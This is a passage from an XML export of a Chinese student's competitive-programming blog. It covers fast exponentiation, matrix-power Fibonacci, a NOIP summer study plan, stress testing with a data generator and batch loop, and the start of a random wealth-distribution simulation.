<td>格式化无符号十六进制数（大写）</td>
</tr>
<tr>
<td>%f</td>
<td>格式化浮点数字，可指定小数点后的精度</td>
</tr>
<tr>
<td>%e</td>
<td>用科学计数法格式化浮点数</td>
</tr>
<tr>
<td>%E</td>
<td>作用同%e，用科学计数法格式化浮点数</td>
</tr>
<tr>
<td>%g</td>
<td>%f和%e的简写</td>
</tr>
<tr>
<td>%G</td>
<td>%f 和 %E 的简写</td>
</tr>
<tr>
<td>%p</td>
<td>用十六进制数格式化变量的地址</td>
</tr>
</tbody></table>
<p>这里的所有格式化输出的使用方法和上面的样例是一样的。</p>
<h2 id="Python函数操作"><a href="#Python函数操作" class="headerlink" title="Python函数操作"></a>Python函数操作</h2><p>Python的函数操作和C++是差不多的不一样的是Python是不需要声明函数的返回类型的。需要使用关键词 def ：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">YunYuanXiang</span> (<span class="params">HaHaHa</span>):</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;GG&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;GG&#x27;</span></span><br><span class="line"><span class="built_in">print</span> YunYuanXiang(<span class="number">123</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><blockquote>
<p>然后Python就开始不学了QAQ，感觉学了也没有什么用……</p>
</blockquote>
<p>不过真的是非常的感叹Python是一个非常强大的语言。就这样然后开始刷题吧……</p>
]]></content>
      <categories>
        <category>开发知识</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>快速幂和矩阵乘法</title>
    <url>/2017/08/03/39883c1204b0/</url>
    <content><![CDATA[<h1 id="快速幂"><a href="#快速幂" class="headerlink" title="快速幂"></a>快速幂</h1><blockquote>
<p>及其不要脸的Xorex终于要开始认真学习了QAQ，补一下前面漏下来的算法知识！</p>
</blockquote>
<h2 id="快速幂方法"><a href="#快速幂方法" class="headerlink" title="快速幂方法"></a>快速幂方法</h2><blockquote>
<p>顾名思义，快速幂就是快速算底数的n次幂。其时间复杂度为 O(log₂N)， 与朴素的O(N)相比效率有了极大的提高，所以说这是一种二分的体现。</p>
</blockquote>
<ul>
<li>首先当我们计算一个数的次方的时候，比如2^10.那么我们按照常理的话，一定是这样计算的，</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> ans=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">10</span>;i++)</span><br><span class="line">ans=ans*<span class="number">2</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li><p>这样的话我们一共计算了10次。但是如果要求<code>2^10000000000</code>次幂的时候我们用地推就有可能超时了，那么我们可不可以优化一下呢。</p>
</li>
<li><p>将<code>2^10</code>转换为<code>2^8*2^2</code>的话，计算的次数就是最少的，也就是说，计算出来<code>2^2</code>需要1次，计算<code>2^8</code>需要计算2次，那么一共就需要计算4次就可以了。这样就大大增加了计算速度。</p>
</li>
<li><p>那么我们该如何拆分出来最简的计算呢，参照二进制，10的二进制就是<code>1010</code>，也就是<code>10=2</code>,<code>1000=8</code>，所以是<code>2^2*2^8</code>.</p>
</li>
<li><p>也就是说我们在计算的时候，只需要求出来指数的二进制形式，根据每一位上，如果存在1就计算这一位为1时表达出来的十进制的幂就好。</p>
</li>
<li><p>在转换为二进制每次进行计算的时候，相对应的幂也要进行计算也就是说当计算<code>1010</code>的时候，算到<code>10</code>，那么我们就要有一个变量的值为2^2，计算到<code>010</code>的时候，一个变量为<code>2^3</code>。这样在再结合二进制当前位是否是1，如果是，就将这个变量乘到ans上面<code>mod</code>k就好。</p>
</li>
</ul>
<h2 id="代码模板"><a href="#代码模板" class="headerlink" title="代码模板"></a>代码模板</h2><p>作为社会主义的好青年，我决定认真的把代码自己写出来！</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> a,b,k,ans=<span class="literal">true</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;a&gt;&gt;b&gt;&gt;k;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;a&lt;&lt;<span class="string">&#x27;^&#x27;</span>&lt;&lt;b&lt;&lt;<span class="string">&quot; mod &quot;</span>&lt;&lt;k&lt;&lt;<span class="string">&#x27;=&#x27;</span>;</span><br><span class="line">    <span class="keyword">while</span>(b)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(b%<span class="number">2</span>) ans=ans*a%k;</span><br><span class="line">        b=(b&gt;&gt;<span class="literal">true</span>);</span><br><span class="line">        a=a*a%k;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="矩阵乘法"><a href="#矩阵乘法" class="headerlink" title="矩阵乘法"></a>矩阵乘法</h1><blockquote>
<p>矩阵乘法其实就是一个矩阵相乘，矩阵的乘法最核心的用途就是在一些通过前面的一些数来地推出来后面的数的时候，可以通过矩阵相乘来表示地推的过程，然后将相同的矩阵相合并，就可以通过快速幂来解决问题。</p>
</blockquote>
<p>首先矩阵的意思就是一个矩阵，如图：</p>
<p><img src="https://xorex.space/image/061.png"></p>
<p>这就是一个矩阵，矩阵的加法和减法是很好理解的，直接相对应的每一位直接相加就好！如果两个矩阵的长和宽是不相等的，那么久没有办法进行相加减。</p>
<p><img src="https://xorex.space/image/062.png"></p>
<p>但是矩阵乘法就不一样了，矩阵乘法是一种非常神奇的东西，他的乘法和加减不一样，乘的时候矩阵的大小是第一个矩阵的高*第二个矩阵的宽。鬼知道为什么矩阵的运算方法为什么是这样的……所以说如果第一个矩阵的列数不等于第二个矩阵的行数，那么这两个矩阵是没有办法进行相乘的。</p>
<p><img src="https://xorex.space/image/063.png"></p>
<p>代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//n为第二个矩阵的列数，m为第一个矩阵的行数。</span></span><br><span class="line"><span class="comment">//p为第一个矩阵的列数或者第二个矩阵的行数（两者是相等的）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Matrix_Mul</span><span class="params">(<span class="keyword">int</span> n,<span class="keyword">int</span> m,<span class="keyword">int</span> p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=m;j++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">1</span>;k&lt;=p;k++)</span><br><span class="line">    c[i][j]+=a[i][k]*b[k][j];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>代码很短，就像Floyd一样充满了美感。神奇的三重循环！</p>
<p>但是这个东西有什么用呢？矩阵乘起来效率真的是不能看啊！但是我们要祭出来神奇的菲波那切数列！</p>
<p>我们但知道，求菲波那切数列的复杂度是O(n)的，看起来并不高，但是如果要求1000000000000范围内的菲波那切数列呢。你是不是傻眼了……我们可以用矩阵乘法来优化一下。</p>
<p>首先，我们构造一个神奇的矩阵：</p>
<p><img src="https://xorex.space/image/064.png"></p>
<p>然后我们手里面有另外一个矩阵：<code>A[F2,F1]</code> ; 其中F1和F2表示的是数列的前两项。</p>
<p>然后我们让 <code>A·B</code>，得到的矩阵是什么？？ <code>[F3,F2]</code>,没错，如果是 <code>A·B·B</code> 呢？那么就是 <code>[F4,F3]</code>,如果我们需要求出来第n项数列，我们只需要求 <code>A·B·B·B……</code> (一共有n-2个B)，也就是 <code>A·B^(n-2)</code> ，对于求出来 <code>B^(n-2)</code> 我们用快速幂直接开始求就好了，其复杂度为 <code>logn</code> 综合来看，总的复杂度是 <code>(2r)3*logn</code> 。</p>
<p>下面是及其不情愿才写出来的代码：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> a[<span class="number">10</span>][<span class="number">10</span>];</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> b[<span class="number">10</span>][<span class="number">10</span>];</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> c[<span class="number">10</span>][<span class="number">10</span>];</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> d[<span class="number">10</span>][<span class="number">10</span>];</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> number;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> Mod=<span class="number">10000</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Matrix_Two</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(c,<span class="literal">false</span>,<span class="keyword">sizeof</span>(c));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">long</span> <span class="keyword">long</span> i=<span class="number">1</span>;i&lt;=<span class="number">2</span>;i++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">long</span> <span class="keyword">long</span> j=<span class="number">1</span>;j&lt;=<span class="number">2</span>;j++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">long</span> <span class="keyword">long</span> k=<span class="number">1</span>;k&lt;=<span class="number">2</span>;k++)</span><br><span class="line">    c[i][j]=(c[i][j]+b[i][k]*b[k][j])%Mod;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Matrix_Ans</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(c,<span class="literal">false</span>,<span class="keyword">sizeof</span>(c));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">long</span> <span class="keyword">long</span> i=<span class="number">1</span>;i&lt;=<span class="number">2</span>;i++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">long</span> <span class="keyword">long</span> j=<span class="number">1</span>;j&lt;=<span class="number">2</span>;j++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">long</span> <span class="keyword">long</span> k=<span class="number">1</span>;k&lt;=<span class="number">2</span>;k++)</span><br><span class="line">    c[i][j]=(c[i][j]+a[i][k]*b[k][j])%Mod;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Matrix_Final</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(c,<span class="literal">false</span>,<span class="keyword">sizeof</span>(c));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">long</span> <span class="keyword">long</span> i=<span class="number">1</span>;i&lt;=<span class="number">1</span>;i++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">long</span> <span class="keyword">long</span> j=<span class="number">1</span>;j&lt;=<span class="number">2</span>;j++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">long</span> <span class="keyword">long</span> k=<span class="number">1</span>;k&lt;=<span class="number">2</span>;k++)</span><br><span class="line">    c[i][j]=(c[i][j]+d[i][k]*a[k][j])%Mod;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Matrix</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(a,<span class="literal">false</span>,<span class="keyword">sizeof</span>(a));</span><br><span class="line">    <span class="built_in">memset</span>(b,<span class="literal">false</span>,<span class="keyword">sizeof</span>(b));</span><br><span class="line">    <span class="built_in">memset</span>(c,<span class="literal">false</span>,<span class="keyword">sizeof</span>(c));</span><br><span class="line">    <span class="built_in">memset</span>(d,<span class="literal">false</span>,<span class="keyword">sizeof</span>(d));</span><br><span class="line">    a[<span class="number">1</span>][<span class="number">1</span>]=<span class="number">1</span>; a[<span class="number">1</span>][<span class="number">2</span>]=<span class="number">1</span>;</span><br><span class="line">    a[<span class="number">2</span>][<span class="number">1</span>]=<span class="number">1</span>; a[<span class="number">2</span>][<span class="number">2</span>]=<span class="number">0</span>;</span><br><span class="line">    b[<span class="number">1</span>][<span class="number">1</span>]=<span class="number">1</span>; b[<span class="number">1</span>][<span class="number">2</span>]=<span class="number">1</span>;</span><br><span class="line">    b[<span class="number">2</span>][<span class="number">1</span>]=<span class="number">1</span>; b[<span class="number">2</span>][<span class="number">2</span>]=<span class="number">0</span>;</span><br><span class="line">    d[<span class="number">1</span>][<span class="number">1</span>]=<span class="number">1</span>; d[<span class="number">1</span>][<span class="number">2</span>]=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Return</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(number==<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="number">0</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(number==<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="number">1</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(number==<span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="number">1</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(number==<span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="number">2</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Matrix_Move_ans</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    a[<span class="number">1</span>][<span class="number">1</span>]=c[<span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">    a[<span class="number">1</span>][<span class="number">2</span>]=c[<span class="number">1</span>][<span class="number">2</span>];</span><br><span class="line">    a[<span class="number">2</span>][<span class="number">1</span>]=c[<span class="number">2</span>][<span class="number">1</span>];</span><br><span class="line">    a[<span class="number">2</span>][<span class="number">2</span>]=c[<span class="number">2</span>][<span class="number">2</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Matrix_Move_Two</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    b[<span class="number">1</span>][<span class="number">1</span>]=c[<span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">    b[<span class="number">1</span>][<span class="number">2</span>]=c[<span class="number">1</span>][<span class="number">2</span>];</span><br><span class="line">    b[<span class="number">2</span>][<span class="number">1</span>]=c[<span class="number">2</span>][<span class="number">1</span>];</span><br><span class="line">    b[<span class="number">2</span>][<span class="number">2</span>]=c[<span class="number">2</span>][<span class="number">2</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Fast_Fuck_PanYunTong</span><span class="params">(<span class="keyword">long</span> <span class="keyword">long</span> number)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(number)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(number&amp;<span class="literal">true</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            Matrix_Ans();</span><br><span class="line">            Matrix_Move_ans();</span><br><span class="line">        &#125;</span><br><span class="line">        number=(number&gt;&gt;<span class="literal">true</span>);</span><br><span class="line">        Matrix_Two();</span><br><span class="line">        Matrix_Move_Two();</span><br><span class="line">    &#125;</span><br><span class="line">    Matrix_Final();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;number)</span><br><span class="line">    &#123;</span><br><span class="line">        Matrix();</span><br><span class="line">        <span class="keyword">if</span>(Return()) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">if</span>(number==<span class="number">-1</span>) <span class="keyword">break</span>;</span><br><span class="line">        Fast_Fuck_PanYunTong(number<span class="number">-3</span>);</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;c[<span class="number">1</span>][<span class="number">1</span>]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<p>不能再水了，马上就要到NOIP了，加油！</p>
<blockquote>
<p>果然废柴就是这样，最近看到许多去雅礼中学参加培训的同学们都找到了目标。不停地奋斗着，而我已经成为了一枚咸鱼。LCY大神决心要面对HAOI和NOI，但是我这个咸鱼还在想着怎么在NOIP2017里面混一个一等奖。不管了，自己实力弱怨不得别人……</p>
</blockquote>
]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>总结</tag>
        <tag>矩阵</tag>
      </tags>
  </entry>
  <entry>
    <title>NOIP前最后的暑假</title>
    <url>/2017/08/01/44d530be0586/</url>
    <content><![CDATA[<h1 id="暑假安排"><a href="#暑假安排" class="headerlink" title="暑假安排"></a>暑假安排</h1><p>话说我是来写暑假安排的，然后莫明的写了很多其他的东西（雾</p>
<p>暑假的话，因为其他人都去了雅礼中学参加培训，实力相比会进步很快的吧，所以我也不能够落下来了呢！住进了机房……就要努力的联系算法啊，所以说给自己列出来一个表，慢慢加油吧！</p>
<h2 id="暑假学习顺序表"><a href="#暑假学习顺序表" class="headerlink" title="暑假学习顺序表"></a>暑假学习顺序表</h2><p>于是就要列出来一些神奇的东西要学习和复习：</p>
<ol>
<li>莫队算法（看起来不是特别难）</li>
<li>矩阵乘法（模拟赛吃亏啊）</li>
<li>提高篇书上的数论和组合数学（NOIP常考）</li>
<li>高精度算法（一定要将板子敲熟！）</li>
<li>复习各种算法+做一两道水题</li>
</ol>
<h2 id="组合数学顺序表"><a href="#组合数学顺序表" class="headerlink" title="组合数学顺序表"></a>组合数学顺序表</h2><p>然后组合数学决定单独列出来整一整：</p>
<ol>
<li>加法原理和乘法原理</li>
<li>排列组合基础</li>
<li>组合数计算</li>
<li>排列和组合的产生（无重集元素）</li>
<li>排列和组合的产生（有重集元素）</li>
<li>秦九昭算法</li>
<li>解线性方程组</li>
</ol>
<h2 id="数论顺序表"><a href="#数论顺序表" class="headerlink" title="数论顺序表"></a>数论顺序表</h2><p>数论也是单独列出来整一整：</p>
<ol>
<li>整数/余数</li>
<li>GCD和LCM</li>
<li>素数和素数表</li>
<li>互质和同余</li>
<li>分解质因数</li>
<li>欧拉函数</li>
<li>扩展欧几里德</li>
<li>莫比乌斯反演</li>
</ol>
<p>好了大概就是这样，暑假的一些目标QAQ</p>
]]></content>
      <categories>
        <category>阶段性总结</category>
      </categories>
      <tags>
        <tag>感想</tag>
        <tag>规划</tag>
      </tags>
  </entry>
  <entry>
    <title>对拍保平安</title>
    <url>/2017/07/16/dadf7a1b7acb/</url>
    <content><![CDATA[<h1 id="所在前面："><a href="#所在前面：" class="headerlink" title="所在前面："></a>所在前面：</h1><blockquote>
<p>其实很久以前就听说对拍了，但是一直没有去学习。临近NOIP，随手写了两道题，都是因为一些小问题而GG，这要是NOIP我就挂掉了，所以为了能更稳一些，彻底践行对拍保平安的思想，去学习了如何进行对拍。</p>
</blockquote>
<h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><p>首先你需要一个暴力算法，非常暴力的暴力算法（没有任何技巧而言的暴力！！！）</p>
<p>注意，你的暴力程序需要保证一定是对的，一定是对的！！！所以说在写暴力的时候不能有任何的技巧或者算法（对于我来说），然后认真的检查暴力程序是不是真正的正确。</p>
<p>然后拿出来你写的比较高级的算法QAQ，和一个数据生成器。</p>
<p>关于数据生成器的写法如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;ctime&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,a,b,m,S;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    srand((<span class="keyword">int</span>)time(<span class="literal">NULL</span>));</span><br><span class="line">    freopen(<span class="string">&quot;All.in&quot;</span>,<span class="string">&quot;w&quot;</span>,<span class="built_in">stdout</span>);</span><br><span class="line">    n=rand()%<span class="number">1000</span>; m=rand()%<span class="number">1000</span>; S=rand();</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;n&lt;&lt;<span class="string">&#x27; &#x27;</span>&lt;&lt;m&lt;&lt;<span class="string">&#x27; &#x27;</span>&lt;&lt;S&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">while</span>(n--&gt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        a=rand()%<span class="number">1000</span>;</span><br><span class="line">        b=rand()%<span class="number">1000</span>;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;a&lt;&lt;<span class="string">&#x27; &#x27;</span>&lt;&lt;b&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(m--&gt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        a=rand()%<span class="number">1000</span>;</span><br><span class="line">        b=rand()%<span class="number">1000</span>;</span><br><span class="line">        <span class="keyword">if</span>(a&gt;b) <span class="built_in">cout</span>&lt;&lt;b&lt;&lt;<span class="string">&#x27; &#x27;</span>&lt;&lt;a&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">cout</span>&lt;&lt;a&lt;&lt;<span class="string">&#x27; &#x27;</span>&lt;&lt;b&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>比较重要的，也就是需要记住的就是下面的东西：</li>
</ul>
<table>
<thead>
<tr>
<th>标号</th>
<th>单词</th>
<th>意义</th>
</tr>
</thead>
<tbody><tr>
<td>1.</td>
<td>Violence</td>
<td>暴力</td>
</tr>
<tr>
<td>2.</td>
<td>Advanced</td>
<td>高级</td>
</tr>
<tr>
<td>3.</td>
<td>cstdlib</td>
<td>头文件</td>
</tr>
<tr>
<td>4.</td>
<td>ctime</td>
<td>头文件</td>
</tr>
<tr>
<td>5.</td>
<td>srand((int)time(NULL));</td>
<td>初始化随机数种子</td>
</tr>
<tr>
<td>6.</td>
<td>fc</td>
<td>比较程序</td>
</tr>
<tr>
<td>7.</td>
<td>pause</td>
<td>关闭程序</td>
</tr>
<tr>
<td>8.</td>
<td>if not errorlevel 1 goto again</td>
<td>如果不是错误就重新执行</td>
</tr>
</tbody></table>
<ul>
<li>记住了然后背代码啊,这个是对拍用的bat程序：</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">:again</span><br><span class="line">Makedata</span><br><span class="line">Advanced</span><br><span class="line">Violent</span><br><span class="line">fc Advanced.out Violent.out</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> errorlevel <span class="number">1</span> <span class="keyword">goto</span> again</span><br><span class="line">pause</span><br></pre></td></tr></table></figure>
<ul>
<li>这个是Violence的<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">freopen(<span class="string">&quot;All.in&quot;</span>,<span class="string">&quot;r&quot;</span>,<span class="built_in">stdin</span>);</span><br><span class="line">freopen(<span class="string">&quot;Violent.out&quot;</span>,<span class="string">&quot;w&quot;</span>,<span class="built_in">stdout</span>);</span><br></pre></td></tr></table></figure></li>
<li>这个是Advanced的<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">freopen(<span class="string">&quot;All.in&quot;</span>,<span class="string">&quot;r&quot;</span>,<span class="built_in">stdin</span>);</span><br><span class="line">freopen(<span class="string">&quot;Advanced.out&quot;</span>,<span class="string">&quot;w&quot;</span>,<span class="built_in">stdout</span>);</span><br></pre></td></tr></table></figure></li>
<li>这个是Makedata的<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">freopen(<span class="string">&quot;All.in&quot;</span>,<span class="string">&quot;w&quot;</span>,<span class="built_in">stdout</span>);</span><br></pre></td></tr></table></figure>
然后再同一个文件夹里面生成exe文件，然后直接执行bat文件就行了：</li>
</ul>
<p>如图：你需要有很多的文件才行的。</p>
<p><img src="https://xorex.space/image/060.png"></p>
<p>所以说需要养成一个好的习惯了，除非写一些大模拟，大暴力和一些无法使用对拍程序来验证代码的正确性的时候，其他都需要写对拍程序，这样的话熟练程度就会大幅度的提高，考试就不用担心犯一些脑残的错误了QAQ（当然是仍然需要徒手构造一些比较大的数据来验证暴力程序是否正确）</p>
<p>大概就这样</p>
]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>测试</tag>
      </tags>
  </entry>
  <entry>
    <title>随机分配下的贫富差距</title>
    <url>/2017/07/12/1ce1519e9919/</url>
    <content><![CDATA[<h1 id="说在前面"><a href="#说在前面" class="headerlink" title="说在前面"></a>说在前面</h1><p>今天在知乎上面看到了一个有趣的问题，就开始颓废了（最后一次颓废）</p>
<h1 id="来源于知乎，随机分配钱求财富分布"><a href="#来源于知乎，随机分配钱求财富分布" class="headerlink" title="来源于知乎，随机分配钱求财富分布"></a>来源于知乎，随机分配钱求财富分布</h1><h2 id="问题描述："><a href="#问题描述：" class="headerlink" title="问题描述："></a>问题描述：</h2><blockquote>
<p>房间内有 100 人，每人有 100 块，每分钟随机给另一个人 1 块，最后这个房间内的财富分布怎样？</p>
</blockquote>
<p>链接：<a href="https://www.zhihu.com/question/62250384">来自知乎</a></p>
<p>刚刚开始拿到这个题目的时候，我想，既然是随机的，那么就一定会分配均匀了啊。然而并不是我想的这样，在提问者给出来的代码跑出来的数据中，情况确实恰恰相反，随着数据的范围不断的扩大，反而贫富差距越来越大了。</p>
<h2 id="实验操作"><a href="#实验操作" class="headerlink" title="实验操作"></a>实验操作</h2><p>然后就自己尝试着跑了一下代码，一个很垃圾的C++代码。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span 